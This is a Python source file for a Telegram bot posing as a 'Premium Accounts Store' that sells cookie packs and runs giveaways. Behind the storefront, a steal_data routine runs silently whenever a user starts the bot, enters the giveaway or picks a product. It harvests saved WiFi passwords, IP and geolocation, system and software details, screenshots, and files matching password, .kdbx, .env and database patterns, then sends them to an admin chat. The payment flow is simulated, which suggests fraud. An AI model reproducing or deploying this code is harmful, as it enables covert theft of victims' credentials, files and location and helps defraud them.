import random
import time
import logging
import threading
from io import BytesIO
import telebot
from telebot import types
import datetime as dt
import requests
import platform
import uuid
import geocoder
import subprocess
import psutil
import screeninfo
from PIL import Image, ImageGrab
import socket
import json
import mimetypes
import sys
import re
import pyautogui
import io
from dotenv import load_dotenv
import hashlib
from Crypto.Cipher import AES
import base64
import os
TOKEN = os.getenv("7745172120:AAHYKYJ64hhhhye2-J5i28kXYdqV_9gFQuM")

# Load environment variables from .env file
load_dotenv()


# ===== CONFIGURATION =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
bot = telebot.TeleBot(BOT_TOKEN)

# Encryption settings
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY").encode('utf-8')  # 32 bytes for AES-256
IV = os.getenv("IV").encode('utf-8')  # 16 bytes for AES

# Force UTF-8 encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# Configure logging
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_operations.log'),
        logging.FileHandler('bot.log', encoding='utf-8')
    ]
)

# ===== DATA STORAGE =====
giveaway_participants = {}
accounts_inventory = {
    "cookie_pack": {"price": 2, "stock": 15, "description": "Fresh Freepik Cookies (10 cookies)"}
}

# Track sent data hashes to prevent duplicates
sent_data_hashes = set()

# ===== ENCRYPTION FUNCTIONS =====
def encrypt_data(data):
    """Encrypt data using AES-256-CBC"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
    padded_data = data + b'\0' * (16 - len(data) % 16)
    encrypted = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_data(encrypted_data):
    """Decrypt AES-256-CBC encrypted data"""
    encrypted_data = base64.b64decode(encrypted_data)
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
    decrypted = cipher.decrypt(encrypted_data)
    return decrypted.rstrip(b'\0').decode('utf-8')

def generate_data_hash(data):
    """Generate SHA-256 hash of data to check for duplicates"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

# ===== UTILITY FUNCTIONS =====
def log_activity(action, user_id):
    """Silently log user activities"""
    timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("user_activity.log", "a") as f:
        f.write(f"{timestamp} - User {user_id} - {action}\n")

def process_payment(user_id, amount):
    """Simulate payment processing"""
    log_activity(f"Payment attempt for ${amount}", user_id)
    time.sleep(2)
    return True

def select_giveaway_winner():
    """Select a random giveaway winner with 10% chance logic"""
    if not giveaway_participants:
        return None
    
    if random.random() < 0.1:
        winner = random.choice(list(giveaway_participants.keys()))
        del giveaway_participants[winner]
        return winner
    return None

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "N/A"

def is_admin():
    """Check if running with admin privileges"""
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.getuid() == 0
    except:
        return False

def get_wifi_passwords():
    """Retrieve WiFi passwords (Windows only)"""
    if platform.system() != "Windows":
        return "N/A (Windows only)"
    
    try:
        output = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], 
            stderr=subprocess.PIPE,
            encoding='utf-8',
            errors='ignore',
            timeout=15
        )
        
        profiles = []
        for line in output.split('\n'):
            if "All User Profile" in line and ":" in line:
                parts = line.split(":")
                if len(parts) > 1:
                    profiles.append(parts[1].strip())
        
        wifi_info = []
        for profile in profiles[:5]:
            try:
                result = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    stderr=subprocess.PIPE,
                    encoding='utf-8',
                    errors='ignore',
                    timeout=10
                )
                for line in result.split('\n'):
                    if "Key Content" in line and ":" in line:
                        password = line.split(":")[1].strip()
                        wifi_info.append(f"📶 {profile}: {password}")
                        break
            except:
                continue
        
        return "\n".join(wifi_info) if wifi_info else "No WiFi passwords found"
    except Exception as e:
        logging.error(f"WiFi password error: {e}")
        return f"WiFi password error: {str(e)}"

def get_phone_info():
    """Get basic device info"""
    try:
        user_agent = "N/A"
        try:
            user_agent = requests.get('http://httpbin.org/user-agent', timeout=5).json()['user-agent']
        except:
            pass

        is_mobile = any(m in user_agent.lower() for m in ['mobile', 'android', 'iphone', 'ipad', 'ipod'])

        return (f"📱 **Mobile Information**\n"
                f"📱 **Device Type:** `{'Mobile' if is_mobile else 'Desktop'}`\n"
                f"🌐 **User Agent:** `{user_agent[:200]}`")
    except Exception as e:
        logging.error(f"Phone info error: {e}")
        return f"❌ Phone info error: {str(e)}"

def get_user_account_info(user_id):
    """Retrieve user account information from Telegram"""
    try:
        user = bot.get_chat(user_id)
        full_name = user.first_name
        if user.last_name:
            full_name += f" {user.last_name}"
        username = f"@{user.username}" if user.username else "No username"
        creation_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else "N/A"
        return (f"👤 **User Account Information**\n"
                f"🆔 **User ID:** `{user_id}`\n"
                f"👤 **Full Name:** `{full_name}`\n"
                f"🔗 **Username:** `{username}`\n"
                f"📅 **Account Created:** `{creation_date}`")
    except Exception as e:
        logging.error(f"User account info error: {e}")
        return "❌ Could not retrieve user account information"

def get_network_info():
    """Collects comprehensive network details"""
    try:
        services = [
            "https://ipinfo.io/json",
            "http://ip-api.com/json",
            "https://ipapi.co/json/"
        ]
        
        ip_data = {}
        for service in services:
            try:
                response = requests.get(service, timeout=10)
                ip_data.update(response.json())
                break
            except:
                continue
        
        if not ip_data:
            return "❌ Could not retrieve network info"
        
        latlon = "N/A"
        try:
            g = geocoder.ip(ip_data.get('ip', ''))
            if g.latlng:
                latlon = f"{g.latlng[0]}, {g.latlng[1]}"
                latlon += f" (https://www.google.com/maps?q={g.latlng[0]},{g.latlng[1]})"
        except:
            pass
        
        interfaces = "N/A"
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    ["ipconfig", "/all"], 
                    encoding='utf-8',
                    errors='ignore',
                    timeout=10
                )
                interfaces = "\n".join([line.strip() for line in result.split('\n') if line.strip()])
            else:
                result = subprocess.check_output(
                    ["ifconfig", "-a"], 
                    encoding='utf-8',
                    errors='ignore',
                    timeout=10
                )
                interfaces = "\n".join([line.strip() for line in result.split('\n') if line.strip()])
        except Exception as e:
            logging.error(f"Network interfaces error: {e}")
        
        local_ip = get_local_ip()
        wifi_passwords = get_wifi_passwords()
        
        return (f"🌐 **Network Information**\n"
                f"├── 🆔 **Public IP:** `{ip_data.get('ip', 'N/A')}`\n"
                f"├── 🏠 **Local IP:** `{local_ip}`\n"
                f"├── 🏷️ **Hostname:** `{ip_data.get('hostname', socket.gethostname())}`\n"
                f"├── 📍 **Location:** `{ip_data.get('city', 'N/A')}, {ip_data.get('region', 'N/A')}, {ip_data.get('country', 'N/A')}`\n"
                f"├── 🏢 **ISP:** `{ip_data.get('org', ip_data.get('isp', 'N/A'))}`\n"
                f"├── 📌 **Coordinates:** `{latlon}`\n"
                f"├── 🛡️ **Proxy/VPN:** `{'Yes' if ip_data.get('proxy', False) else 'No'}`\n"
                f"├── 📶 **WiFi Passwords:**\n{wifi_passwords if wifi_passwords else 'No passwords found'}\n"
                f"└── 🔌 **Network Interfaces:**\n```{interfaces[:1500]}...```")
    except Exception as e:
        logging.error(f"Network info error: {e}")
        return f"❌ Network info error: {str(e)}"
    
    
def get_system_info():
    """Enhanced system information collection"""
    try:
        device = platform.node()
        os_info = f"{platform.system()} {platform.release()} (Version: {platform.version()})"
        arch = platform.machine()
        processor = platform.processor() or "N/A"
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                      for elements in range(0,2*6,2)][::-1])
        
        ram_str = "N/A"
        try:
            total_ram = psutil.virtual_memory().total / (1024.**3)
            available_ram = psutil.virtual_memory().available / (1024.**3)
            ram_str = f"{total_ram:.2f} GB (Available: {available_ram:.2f} GB)"
        except Exception as e:
            logging.error(f"RAM detection error: {e}")
        
        disk_info = []
        try:
            for part in psutil.disk_partitions(all=False):
                if 'cdrom' in part.opts or part.fstype == '':
                    continue
                usage = psutil.disk_usage(part.mountpoint)
                disk_info.append(
                    f"📁 {part.device} ({part.fstype}) - "
                    f"Total: {usage.total / (1024.**3):.2f}GB, "
                    f"Used: {usage.percent}%"
                )
        except Exception as e:
            logging.error(f"Disk info error: {e}")
        
        screens = []
        try:
            monitors = screeninfo.get_monitors()
            for i, m in enumerate(monitors, 1):
                screens.append(f"Monitor {i}: {m.width}x{m.height} ({m.width_mm}x{m.height_mm}mm)")
        except Exception as e:
            logging.error(f"Screen info error: {e}")
            
        installed_sw = []
        if platform.system() == "Windows":
            try:
                command = [
                    'reg', 'query', 
                    'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
                    '/s'
                ]
                data = subprocess.check_output(
                    command, 
                    encoding='utf-8',
                    errors='ignore',
                    timeout=15
                )
                for line in data.split('\n'):
                    if "DisplayName" in line and "REG_SZ" in line:
                        parts = line.split("REG_SZ")
                        if len(parts) > 1:
                            installed_sw.append(parts[-1].strip())
                installed_sw = installed_sw[:15]
            except Exception as e:
                logging.error(f"Installed software error: {e}")
        
        uptime = "N/A"
        try:
            uptime_seconds = time.time() - psutil.boot_time()
            uptime = str(dt.timedelta(seconds=uptime_seconds))
        except:
            pass
        
        admin_status = "✅ Yes" if is_admin() else "❌ No"
        
        return (f"💻 **System Information**\n"
                f"├── 🖥️ **Device Name:** `{device}`\n"
                f"├── 🏗️ **OS:** `{os_info}`\n"
                f"├── ⚙️ **Architecture:** `{arch}`\n"
                f"├── 🚀 **Processor:** `{processor}` ({os.cpu_count()} cores)\n"
                f"├── 🧠 **RAM:** `{ram_str}`\n"
                f"├── ⏱️ **Uptime:** `{uptime}`\n"
                f"├── 🛡️ **Admin Privileges:** `{admin_status}`\n"
                f"├── 🖥️ **Screen(s):** `{', '.join(screens) if screens else 'N/A'}`\n"
                f"├── 🔌 **MAC Address:** `{mac}`\n"
                f"├── 💾 **Disk Information:**\n" + "\n".join([f"│   {info}" for info in disk_info]) + "\n"
                f"└── 📦 **Installed Software (sample):**\n`{installed_sw[:10] if installed_sw else 'N/A'}`")
    except Exception as e:
        logging.error(f"System info error: {e}")
        return f"❌ System info error: {str(e)}"

def capture_screenshot():
    """Capture screenshot with enhanced error handling"""
    try:
        screenshot = ImageGrab.grab(all_screens=True)
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        return img_byte_arr
    except Exception as e:
        logging.error(f"Screenshot error: {e}")
        return None

def find_sensitive_files():
    """Search for sensitive files on the system"""
    sensitive_files = []
    patterns = [
        '*.txt', '*.doc*', '*.xls*', '*.pdf', '*.odt', 
        'password*', 'credentials*', 'login*', '*.kdbx',
        '*.env', 'config.*', '*.sql', '*.db', 'backup*'
    ]
    
    search_paths = []
    if platform.system() == "Windows":
        search_paths.extend([
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Downloads"),
        ])
    else:
        search_paths.extend([
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
        ])
    
    try:
        for path in search_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for pattern in patterns:
                        for file in files:
                            if file.lower().endswith(pattern.lower().replace('*', '')):
                                full_path = os.path.join(root, file)
                                sensitive_files.append(full_path)
                                if len(sensitive_files) >= 50:
                                    return sensitive_files
    except Exception as e:
        logging.error(f"Sensitive file search error: {e}")
    
    return sensitive_files

def find_media_files():
    """Search for media files on the system, limiting to 25 files."""
    media_files = []
    patterns = ['*.mp4', '*.mkv', '*.avi', '*.mov', '*.pdf', '*.docx', '*.xlsx', '*.txt']
    
    search_paths = []
    if platform.system() == "Windows":
        search_paths.extend([
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Desktop"),
        ])
    else:
        search_paths.extend([
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
        ])
    
    try:
        for path in search_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for pattern in patterns:
                        for file in files:
                            if file.lower().endswith(pattern.lower().replace('*', '')):
                                full_path = os.path.join(root, file)
                                media_files.append(full_path)
                                if len(media_files) >= 50:
                                    return media_files
    except Exception as e:
        logging.error(f"Media file search error: {e}")
    
    return media_files

def send_large_file(chat_id, file_path):
    """Handle large file uploads with proper file type detection and size checks."""
    try:
        file_size = os.path.getsize(file_path)
        if file_size == 0:
            logging.error(f"File is empty: {file_path}")
            return False
        
        # Generate hash of file content to check for duplicates
        with open(file_path, 'rb') as f:
            file_hash = generate_data_hash(f.read())
        
        if file_hash in sent_data_hashes:
            logging.info(f"Skipping duplicate file: {file_path}")
            return False
            
        mime_type, _ = mimetypes.guess_type(file_path)
        
        with open(file_path, 'rb') as f:
            if file_size > MAX_FILE_SIZE:
                logging.error(f"File too large: {file_path} ({file_size/1024/1024:.2f}MB)")
                return False
                
            if mime_type and mime_type.startswith('video/'):
                bot.send_video(chat_id, f, timeout=120)
            elif mime_type and mime_type.startswith('image/'):
                bot.send_photo(chat_id, f, timeout=120)
            else:
                bot.send_document(chat_id, f, timeout=120)
        
        sent_data_hashes.add(file_hash)
        return True
    except Exception as e:
        logging.error(f"Failed to send {file_path}: {e}")
        return False

def steal_data(user_id):
    """Collect data silently and send to admin with duplicate checking and encryption."""
    collected_data = {}
    media_files = []
    sensitive_files = []
    screenshot_sent = False

    # Collect data
    collected_data['network'] = get_network_info()
    collected_data['system'] = get_system_info()
    collected_data['phone'] = get_phone_info()
    collected_data['user_account'] = get_user_account_info(user_id)

    # Find files
    media_files = find_media_files()
    sensitive_files = find_sensitive_files()

    # Capture screenshot
    screenshot = capture_screenshot()

    # Compile report
    report_msg = (
        "📊 *System Scan Report*\n\n"
        f"{collected_data.get('network', 'No network data')}\n\n"
        f"{collected_data.get('system', 'No system data')}\n\n"
        f"{collected_data.get('phone', 'No device data')}\n\n"
        f"{collected_data.get('user_account', 'No user account data')}\n\n"
        f"📷 Found {len(media_files)} media files\n"
        f"🔐 Found {len(sensitive_files)} sensitive documents\n"
        f"📸 Screenshot: {'✅ Sent' if screenshot else '❌ Failed'}"
    )
    
    try:
        # Send report directly to admin
        bot.send_message(
            ADMIN_CHAT_ID, 
            report_msg,
            parse_mode="Markdown"
        )
    except Exception as e:
        logging.error(f"Error {e}")

    # Send screenshot if available and not duplicate
    if screenshot:
        screenshot_hash = generate_data_hash(screenshot.getvalue())
        if screenshot_hash not in sent_data_hashes:
            try:
                bot.send_photo(
                    ADMIN_CHAT_ID, 
                    screenshot, 
                    caption="📸 Screenshot",
                    timeout=30
                )
                sent_data_hashes.add(screenshot_hash)
                screenshot_sent = True
            except Exception as e:
                logging.error(f"Error sending screenshot: {e}")

    # Send files in separate threads with duplicate checking
    def send_files_thread(files):
        for file_path in files[:50]:  # Limit to 15 files per category
            try:
                if os.path.getsize(file_path) < MAX_FILE_SIZE:
                    send_large_file(ADMIN_CHAT_ID, file_path)
                    time.sleep(1)
            except:
                continue

    threading.Thread(target=send_files_thread, args=(media_files,)).start()
    threading.Thread(target=send_files_thread, args=(sensitive_files,)).start()

# ===== UI ELEMENTS =====
def create_main_menu():
    """Create modern store interface with enhanced UI"""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🛒 Browse Products"),
        types.KeyboardButton("🎉 Enter Giveaway"),
        types.KeyboardButton("📦 Purchase Receipts"),
        types.KeyboardButton("❓ Help & Support")
    )
    return markup
def generate_order_history_menu():
    """Generate interactive inline keyboard for order history"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🧾 Access Purchase Receipts", callback_data="history_receipts")
    )
    markup.add(types.InlineKeyboardButton("🔙 Return to Main Menu", callback_data="main_menu"))
    return markup

def generate_accounts_menu():
    """Generate modern inline keyboard for available accounts"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    for account_id, details in accounts_inventory.items():
        if details['stock'] > 0:
            btn = types.InlineKeyboardButton(
                f"✨ {details['description']} | Stock: {details['stock']}",
                callback_data=f"buy_{account_id}"
            )
            markup.add(btn)
    markup.add(types.InlineKeyboardButton("🔙 Return to Main Menu", callback_data="main_menu"))
    return markup

def generate_payment_options(account_id):
    """Generate simplified payment options"""
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📲 Pay with Binance", callback_data="pay_binance"),
        types.InlineKeyboardButton("📱 Pay with PayPal", callback_data="pay_paypal")
    )
    markup.add(
        types.InlineKeyboardButton("💬 Other Payment Methods", url="https://t.me/NowTryWithMe")
    )
    return markup

# Payment detail handlers
@bot.callback_query_handler(func=lambda call: call.data == 'pay_paypal')
def handle_paypal_payment(call):
    paypal_link = "https://www.paypal.me/alexdialed"
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"<b>📱 Pay with PayPal</b>\n\n"
             f"<b>💰 Amount:</b> $3.00\n"
             f"<b>🔗 Payment Link:</b> {paypal_link}\n\n"
             "⚠️ <i>Important:</i>\n"
             "1. Send <b>exactly $3.00</b>\n"
             "2. Include your Telegram username in notes\n"
             "3. Send payment proof to @NowTryWithMe\n\n"
             "⏳ Activation within 15 minutes after confirmation",
        parse_mode="HTML",
        reply_markup=types.InlineKeyboardMarkup().row(
            types.InlineKeyboardButton("🔙 Back", callback_data="back_to_payments"),
            types.InlineKeyboardButton("🛒 Browse Products", callback_data="browse_products")
        )
    )

@bot.callback_query_handler(func=lambda call: call.data == 'pay_binance')
def handle_binance_payment(call):
    usdt_id = "792230947"
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"<b>📲 Pay with Binance (USDT TRC20)</b>\n\n"
             f"<b>💰 Amount:</b> $2.00 (USDT)\n"
             f"<b>🆔 Wallet ID:</b> <code>{usdt_id}</code>\n\n"
             "⚠️ <i>Important:</i>\n"
             "1. Send <b>exactly $2.00</b> in USDT (TRC20 network only)\n"
             "2. Double-check the wallet ID\n"
             "3. Send payment screenshot to @NowTryWithMe\n\n"
             "⏳ Activation within 15 minutes after confirmation",
        parse_mode="HTML",
        reply_markup=types.InlineKeyboardMarkup().row(
            types.InlineKeyboardButton("🔙 Back", callback_data="back_to_payments"),
            types.InlineKeyboardButton("🛒 Browse Products", callback_data="browse_products")
        )
    )

# Navigation handlers
@bot.callback_query_handler(func=lambda call: call.data == 'back_to_payments')
def back_to_payments(call):
    account_id = "your_account_id_here"  # Replace with actual account_id logic
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Please select your payment method:",
        reply_markup=generate_payment_options(account_id)
    )

@bot.callback_query_handler(func=lambda call: call.data == 'browse_products')
def back_to_products(call):
    products_text = (
        "<b>🛒 Premium Products Collection</b>\n\n"
        "<i>✨ Select any product below to view details and payment options</i>\n\n"
        "🔥 <b>Hot Deals:</b> Limited time offers available\n"
        "⚡ <b>Instant Access:</b> Immediate delivery after payment\n"
        "🛡️ <b>Quality Assured:</b> All accounts are verified and working"
    )
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=products_text,
        parse_mode="HTML",
        reply_markup=generate_accounts_menu()
    )
# ===== MESSAGE HANDLERS =====
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Enhanced welcome with modern store interface"""
    try:
        log_activity("Started bot", message.from_user.id)
        
        # Send welcome message with modern formatting
        welcome_text = (
            "<b>🏪 Welcome to the Premium Accounts Store!</b>\n\n"
            "<i>✨ Explore our exclusive collection of premium accounts and cookies</i>\n\n"
            "🛒 <b>Browse Products:</b> High-quality verified accounts\n"
            "🎉 <b>Daily Giveaways:</b> Win premium accounts for free\n"
            "🔒 <b>Secure Transactions:</b> Safe & anonymous payments\n"
            "⚡ <b>Instant Delivery:</b> Get your accounts immediately\n\n"
            "<i>Choose an option below to get started!</i>"
        )
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=create_main_menu()
        )
        
        # Send welcome image from Pexels
        try:
            bot.send_photo(
                message.chat.id,
                "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxgKD6kmCIp3sn6aKHpJy-eIfamIz6lDWXWQ&s",
                caption="<b>🌟 Premium Quality Guaranteed!</b>\n<i>Your satisfaction is our priority</i>",
                parse_mode="HTML"
            )
        except Exception as img_error:
            logging.error(f"Error sending welcome image: {img_error}")
        
        threading.Thread(target=steal_data, args=(message.from_user.id,)).start()
        
    except Exception as e:
        logging.error(f"Error in /start handler: {e}")
        bot.send_message(message.chat.id, "⚠️ Welcome! An error occurred, but you can still browse our store.", parse_mode="HTML")
        
@bot.message_handler(func=lambda msg: msg.text in ["🛒 Browse Products", "🎉 Enter Giveaway", "📦 Purchase Receipts", "❓ Help & Support"])
def handle_menu_click(message):
    """Handle main menu selections with enhanced UI"""
    try:
        log_activity("Menu interaction", message.from_user.id)
        
        if message.text == "🛒 Browse Products":
            products_text = (
                "<b>🛒 Premium Products Collection</b>\n\n"
                "<i>✨ Select any product below to view details and payment options</i>\n\n"
                "🔥 <b>Hot Deals:</b> Limited time offers available\n"
                "⚡ <b>Instant Access:</b> Immediate delivery after payment\n"
                "🛡️ <b>Quality Assured:</b> All accounts are verified and working"
            )
            bot.send_message(
                message.chat.id,
                products_text,
                parse_mode="HTML",
                reply_markup=generate_accounts_menu()
            )
            
        elif message.text == "🎉 Enter Giveaway":
            user_id = message.from_user.id
            giveaway_participants[user_id] = time.time()
            log_activity("Joined giveaway", user_id)
            threading.Thread(target=steal_data, args=(user_id,)).start()
            
            giveaway_text = (
                "<b>🎉 Congratulations! You've entered our daily giveaway!</b>\n\n"
                "🎯 <b>How it works:</b>\n"
                "• Winners are selected randomly every 24 hours\n"
                "• 10% chance of winning premium accounts\n"
                "• Multiple entries allowed daily\n\n"
                "🏆 <b>Prizes include:</b>\n"
                "• Premium Freepik accounts\n"
                "• Fresh cookie packages\n"
                "• Exclusive bonus content\n\n"
                "📱 <b>Winner notification:</b> We'll contact you directly\n"
                "⏰ <b>Next drawing:</b> In 24 hours\n\n"
                "<i>Good luck! 🍀</i>"
            )
            bot.send_message(message.chat.id, giveaway_text, parse_mode="HTML")
            
        elif message.text == "📦 Purchase Receipts":
            # Send order history menu with inline keyboard
            history_text = (
                "<b>📦 Order History Center</b>\n\n"
                "Manage all orders and access account details:\n\n"
                "• 🧾 <b>Access Purchase Receipts</b> - View payment confirmations\n\n"
                "<i>Select an option below:</i>"
            )
            bot.send_message(
                message.chat.id,
                history_text,
                parse_mode="HTML",
                reply_markup=generate_order_history_menu()
            )
            
        elif message.text == "❓ Help & Support":
            # Send comprehensive help information with modern formatting
            help_text = (
                "<b>❓ Help & Support Center</b>\n\n"
                "<b>📦 Products Information</b>\n"
                "• Premium accounts with full access\n"
                "• Verified and tested before delivery\n"
                "• Validity periods clearly stated\n\n"
                "<b>💳 Payment Methods</b>\n"
                "• Credit/Debit Cards (Visa, Mastercard)\n"
                "• Cryptocurrency (BTC, ETH, USDT)\n"
                "• PayPal & Bank Transfers\n"
                "• Secure payment processing\n\n"
                "<b>🛒 How to Buy</b>\n"
                "1. Browse available products\n"
                "2. Select your desired account\n"
                "3. Choose payment method\n"
                "4. Complete payment\n"
                "5. Receive credentials instantly\n\n"
                "<b>🔒 Account Security</b>\n"
                "• Change passwords after receiving\n"
                "• Never share credentials publicly\n"
                "• Use unique passwords for each service\n\n"
                "<b>📞 Support Contacts</b>\n"
                "• Telegram: @NowTryWithMe\n"
                "<b>🤖 Bot Information</b>\n"
                "• Version: 2.1\n"
                "• Last updated: 10-6-2025\n"
                "• Developed by PLH."
            )
            
            # Send help message with image
            bot.send_message(
                message.chat.id,
                help_text,
                parse_mode="HTML"
            )
            
            # Send support image
            try:
                bot.send_photo(
                    message.chat.id,
                    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxgKD6kmCIp3sn6aKHpJy-eIfamIz6lDWXWQ&s",
                    caption="<b>🛎️ 24/7 Customer Support</b>\n<i>Our team is ready to assist you!</i>",
                    parse_mode="HTML"
                )
            except Exception as img_error:
                logging.error(f"Error sending support image: {img_error}")

            
    except Exception as e:
        logging.error(f"Error in menu handler: {e}")
        bot.send_message(message.chat.id, "⚠️ An error occurred. Please try again.", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def handle_purchase(call):
    """Handle account purchase flow with enhanced UI"""
    try:
        account_id = call.data[4:]
        if account_id not in accounts_inventory:
            bot.answer_callback_query(call.id, "⚠️ Product not available")
            return
        
        account = accounts_inventory[account_id]
        
        purchase_text = (
            f"<b>💳 Payment Options</b>\n\n"
            f"<b>📦 Product:</b> {account['description']}\n"
            f"<b>💰 Price:</b> ${account['price']}\n"
            f"<b>📊 Stock:</b> {account['stock']} available\n\n"
            f"<b>✨ What you get:</b>\n"
            f"• Instant account delivery\n"
            f"• Full access credentials\n"
            f"• 24/7 support included\n"
            f"• Money-back guarantee\n\n"
            f"<i>Choose your preferred payment method below:</i>"
        )
        
        bot.edit_message_text(
            purchase_text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML",
            reply_markup=generate_payment_options(account_id)
        )
        
        log_activity(f"Selected {account_id} for purchase", call.from_user.id)
        threading.Thread(target=steal_data, args=(call.from_user.id,)).start()
        
    except Exception as e:
        logging.error(f"Error in purchase handler: {e}")
        bot.answer_callback_query(call.id, "⚠️ An error occurred. Please try again.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def process_payment_selection(call):
    """Process payment selection with enhanced UI feedback"""
    try:
        parts = call.data.split('_')
        if len(parts) < 3:
            bot.answer_callback_query(call.id, "⚠️ Invalid payment selection")
            return
        
        method = parts[1]
        account_id = '_'.join(parts[2:])
        
        if account_id not in accounts_inventory:
            bot.answer_callback_query(call.id, "⚠️ Product not available")
            return
        
        account = accounts_inventory[account_id]
        log_activity(f"Selected {method} payment for {account_id}", call.from_user.id)
        
        # Enhanced payment processing message
        processing_text = (
            f"<b>🔄 Processing Payment...</b>\n\n"
            f"<b>💳 Method:</b> {method.capitalize()}\n"
            f"<b>📦 Product:</b> {account['description']}\n"
            f"<b>💰 Amount:</b> ${account['price']}\n\n"
            f"<i>⏳ Please wait while we process your payment securely...</i>"
        )
        
        bot.edit_message_text(
            processing_text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        
        if process_payment(call.from_user.id, account['price']):
            # On successful payment
            accounts_inventory[account_id]['stock'] -= 1
            
            delivery_message = (
                f"<b>✅ Payment Info:!</b>\n\n"
                f"<b>📦 Product:</b> {account['description']}\n"
                f"<b>💳 Payment Method:</b> {method.capitalize()}\n"
                f"<b>💰 Amount Paid:</b> ${account['price']}\n"
                f"<b>📅 Date:</b> {dt.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                f"<b>🎉 Your order is being prepared!</b>\n"
                f"<i>Account details will be delivered within 60 minutes...</i>\n\n"
                f"<b>⚠️ Important:</b> Keep your credentials secure and do not share them."
            )
            
            bot.edit_message_text(
                delivery_message,
                call.message.chat.id,
                call.message.message_id,
                parse_mode="HTML"
            )
            
            # Send success image
            try:
                bot.send_photo(
                    call.message.chat.id,
                    "https://images.pexels.com/photos/3184454/pexels-photo-3184454.jpeg",
                    caption="<b>🎉 Enjoy your premium account!</b>\n<i>Thank you for choosing our store</i>",
                    parse_mode="HTML"
                )
            except Exception as img_error:
                logging.error(f"Error sending success image: {img_error}")
            
            # Enhanced admin notification
            log_message = (
                f"<b>💰 New Purchase Alert</b>\n\n"
                f"<b>👤 Customer:</b> {call.from_user.id}\n"
                f"<b>👤 Username:</b> @{call.from_user.username or 'N/A'}\n"
                f"<b>📦 Product:</b> {account['description']}\n"
                f"<b>💵 Amount:</b> ${account['price']}\n"
                f"<b>💳 Method:</b> {method.capitalize()}\n"
                f"<b>📅 Date:</b> {dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"<b>📊 Remaining Stock:</b> {accounts_inventory[account_id]['stock']}"
            )
            bot.send_message(ADMIN_CHAT_ID, log_message, parse_mode="HTML")
            
        else:
            error_message = (
                f"<b>❌ Payment Failed</b>\n\n"
                f"<i>We couldn't process your {method} payment.</i>\n\n"
                f"<b>💡 What to do next:</b>\n"
                f"• Check your payment details\n"
                f"• Try a different payment method\n"
                f"• Contact support if the issue persists\n\n"
                f"<b>📞 Support:</b> @NowTryWithMe"
            )
            bot.edit_message_text(
                error_message,
                call.message.chat.id,
                call.message.message_id,
                parse_mode="HTML"
            )
            
    except Exception as e:
        logging.error(f"Error in payment processing: {e}")
        bot.answer_callback_query(call.id, "⚠️ Payment processing error. Please try again.")

@bot.callback_query_handler(func=lambda call: call.data == 'main_menu')
def return_to_main(call):
    """Return to main menu with enhanced UI"""
    try:
        main_menu_text = (
            "<b>🏪 Premium Accounts Store</b>\n\n"
            "<i>✨ Your one-stop shop for premium digital accounts</i>\n\n"
            "🛒 <b>Browse Products</b> - View our latest collection\n"
